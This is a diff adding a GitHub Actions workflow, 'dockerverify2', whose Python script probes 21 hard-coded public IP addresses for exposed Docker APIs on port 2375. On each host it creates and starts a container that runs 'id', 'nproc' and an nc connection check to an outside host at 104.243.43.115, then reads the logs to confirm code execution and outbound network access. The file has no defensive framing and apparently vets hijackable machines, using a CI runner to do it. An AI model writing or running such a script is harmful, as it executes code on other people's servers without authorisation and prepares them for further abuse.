@@ -1,0 +1,60 @@
+name: dockerverify2
+
+on:
+  workflow_dispatch:
+
+jobs:
+  verify:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - name: verify
+        run: |
+          python3 -m pip install --quiet requests
+          python3 - <<'PY'
+          import concurrent.futures
+          import secrets
+          import time
+
+          import requests
+
+          HOSTS = [
+              ("162.218.120.200", 16), ("192.3.222.123", 16), ("188.190.16.12", 16),
+              ("166.0.192.152", 16), ("198.46.146.75", 16), ("45.58.52.15", 16),
+              ("216.238.101.165", 16), ("176.100.36.79", 8), ("35.183.61.7", 8),
+              ("52.10.133.238", 8), ("34.219.187.12", 8), ("54.189.141.187", 8),
+              ("18.175.153.149", 8), ("18.175.211.206", 8), ("16.51.187.186", 8),
+              ("15.224.203.224", 8), ("62.210.137.232", 8), ("107.161.24.132", 8),
+              ("198.44.87.45", 8), ("64.44.30.11", 8), ("148.113.243.171", 8),
+          ]
+
+          def verify(row):
+              ip, cores = row
+              base = f"http://{ip}:2375"
+              mark = "MARK" + secrets.token_hex(4)
+              try:
+                  bogus = requests.get(base + "/containers/lc-nope/json", timeout=5)
+                  if bogus.status_code != 404:
+                      return (ip, cores, "facade")
+                  body = {"Image": "alpine:latest",
+                          "Cmd": ["/bin/sh", "-c",
+                                  f"echo {mark}; id; nproc; nc -z -w4 104.243.43.115 443; echo NET=$?"],
+                          "HostConfig": {}}
+                  created = requests.post(base + "/containers/create", json=body, timeout=8)
+                  cid = created.json().get("Id", "")
+                  if not cid:
+                      return (ip, cores, "create")
+                  requests.post(base + f"/containers/{cid}/start", timeout=8)
+                  time.sleep(2)
+                  logs = requests.get(base + f"/containers/{cid}/logs?stdout=1&stderr=1", timeout=6).text
+                  if mark in logs:
+                      return (ip, cores, "REAL", "NET=0" in logs, logs[:160])
+                  return (ip, cores, "no-marker")
+              except Exception as exc:
+                  return (ip, cores, type(exc).__name__)
+
+          with concurrent.futures.ThreadPoolExecutor(max_workers=16) as pool:
+              for res in pool.map(verify, HOSTS):
+                  print("RESULT", res, flush=True)
+          PY
